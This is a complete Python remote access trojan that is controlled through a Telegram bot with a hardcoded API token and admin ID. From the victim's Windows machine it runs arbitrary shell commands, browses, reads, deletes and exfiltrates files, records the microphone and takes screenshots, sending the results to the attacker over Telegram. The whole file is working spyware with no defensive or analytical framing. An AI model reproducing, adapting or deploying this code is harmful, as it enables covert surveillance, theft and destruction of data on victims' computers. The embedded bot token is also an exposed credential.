import subprocess
import pyautogui
import telebot
from telebot import types
import pyaudio
import wave
import os

API_TOKEN = "6466690541:AAFfFWUqEbEzZfIOuybgrqHot_hJYBiI-eI"
ADMIN = 804011643

bot = telebot.TeleBot(API_TOKEN)

def record(time=6):
    filename = "recorded.wav"

    chunk = 1024
    FORMAT = pyaudio.paInt16
    channels = 1
    sample_rate = 44100

    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=channels,
                    rate=sample_rate,
                    input=True,
                    output=True,
                    frames_per_buffer=chunk)
    frames = []
    for i in range(int(44100 / chunk * time)):
        data = stream.read(chunk)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(filename, "wb")
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(sample_rate)
    wf.writeframes(b"".join(frames))
    wf.close()

def checkID(ms):
    if ms.from_user.id == ADMIN:
        return True
    else:
        info = f"""
        Name - {ms.from_user.first_name}
        Surname - {ms.from_user.last_name}
        UserName - {ms.from_user.username}
        Language - {ms.from_user.language_code}
        """
        bot.send_message(ADMIN, "USED:")
        bot.send_message(ADMIN, info)
        return False

def exec_cd(ms):
    if checkID(ms):
        output = os.getcwd()
        bot.send_message(ADMIN, output)

def exec_cd_path(ms):
    if checkID:
        bot.send_message(ADMIN, "Enter path...")
        
        @bot.message_handler(content_types=["text"])
        def exec_cd_path_next(ms):
            if checkID(ms):
                try:
                    path = ms.text
                    os.chdir(path)
                    output = os.getcwd()
                    bot.send_message(ADMIN, output)
                except Exception as e:
                    bot.send_message(ADMIN, f"Error:\n{e}")

        bot.register_next_step_handler(ms, exec_cd_path_next)

def exec_dir(ms):
    if checkID(ms):
        output = subprocess.check_output("dir /b", shell=True).decode("utf-8")
        bot.send_message(ADMIN, output)

def exec_del(ms):
    if checkID(ms):
        bot.send_message(ADMIN, "Enter path...")

        @bot.message_handler(content_types=["text"])
        def exec_del_next(ms):
            if checkID(ms):
                try:
                    path_file = ms.text
                    os.remove(path_file)
                    bot.send_message(ADMIN, "File removed!")
                except Exception as e:
                    bot.send_message(ADMIN, f"Error:\n{e}")

        bot.register_next_step_handler(ms, exec_del_next)

def exec_type(ms):
    if checkID(ms):
        bot.send_message(ADMIN, "Enter path...")
        
        @bot.message_handler(content_types=["text"])
        def exec_type_next(ms):
            if checkID(ms):
                path = ms.text
                output = subprocess.check_output(f"type {path}", shell=True).decode("utf-8")
                if output:
                    bot.send_message(ADMIN, output)
                else:
                    bot.send_message(ADMIN, "<Empty>")

        bot.register_next_step_handler(ms, exec_type_next)

def exec_get_file(ms):
    if checkID(ms):
        bot.send_message(ADMIN, "Enter path...")
        
        @bot.message_handler(content_types=["text"])
        def get_file_next(ms):
            if checkID(ms):
                path = ms.text
                bot.send_document(ADMIN, open(path, "rb"))
        
        bot.register_next_step_handler(ms, get_file_next)

def exec_recording(ms):
    if checkID(ms):
        bot.send_message(ADMIN, "Enter time, quantity iteration...")
        
        @bot.message_handler(content_types=["text"])
        def micro_recording_last(ms):
            if checkID(ms):
                try:
                    list_data = ms.text.split(" ")
                    time = int(list_data[0])
                    quantity = int(list_data[1])
                    bot.send_message(ADMIN, "Recording...")
                    
                    for i in range(quantity):
                        record(time)
                        with open("recorded.wav", 'rb') as audio:
                            bot.send_audio(ADMIN, audio)
                    
                    bot.send_message(ADMIN, "Finished recording.")
                except Exception as e:
                    bot.send_message(ADMIN, f"Error:\n{e}")

        bot.register_next_step_handler(ms, micro_recording_last)

def exec_screenshot(ms):
    if checkID(ms):
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save("screenshot.jpg")

        with open("screenshot.jpg", "rb") as photo:
            bot.send_photo(ADMIN, photo)

def exec_cmd_sub(ms):
    if checkID(ms):
        bot.send_message(ADMIN, "Enter command...")

        @bot.message_handler(content_types=["text"])
        def exec_cmd_os_next(ms):
            try:
                cmd = ms.text
                output = subprocess.check_output(cmd, shell=True).decode("utf-8")
                if output:
                    bot.send_message(ADMIN, output)
                else:
                    bot.send_message(ADMIN, "Empty")
            except Exception as e:
                bot.send_message(ADMIN, f"Error:\n{e}")

        bot.register_next_step_handler(ms, exec_cmd_os_next)

@bot.message_handler(commands=["_start", "_help"])
def send_welcome(ms):
    if checkID(ms):
        markup = types.ReplyKeyboardMarkup()

        cd_btn = types.KeyboardButton("cd")
        cd_path_btn = types.KeyboardButton("cd_path")
        dir_btn = types.KeyboardButton("dir")
        del_btn = types.KeyboardButton("del")
        exec_type_btn = types.KeyboardButton("type")
        exec_get_file_btn = types.KeyboardButton("get_file")
        exec_cmd_sub_btn = types.KeyboardButton("exec_cmd_sub")
        record_btn = types.KeyboardButton("record")
        screenshot_btn = types.KeyboardButton("screenshot")
        markup.add(cd_btn, cd_path_btn, dir_btn, exec_type_btn, del_btn,
                   exec_cmd_sub_btn, exec_get_file_btn, record_btn, screenshot_btn)

        bot.send_message(ADMIN, text="Yretra", reply_markup=markup)


@bot.message_handler(content_types=["text"])
def CheckCommand(ms):
    if checkID(ms):
        if ms.text == "cd":
            exec_cd(ms)

        elif ms.text == "cd_path":
            exec_cd_path(ms)

        elif ms.text == "dir":
            exec_dir(ms)

        elif ms.text == "del":
            exec_del(ms)
        
        elif ms.text == "type":
            exec_type(ms)
        
        elif ms.text == "get_file":
            exec_get_file(ms)

        elif ms.text == "record":
            exec_recording(ms)

        elif ms.text == "screenshot":
            exec_screenshot(ms)

        elif ms.text == "exec_cmd_sub":
            exec_cmd_sub(ms)

bot.infinity_polling()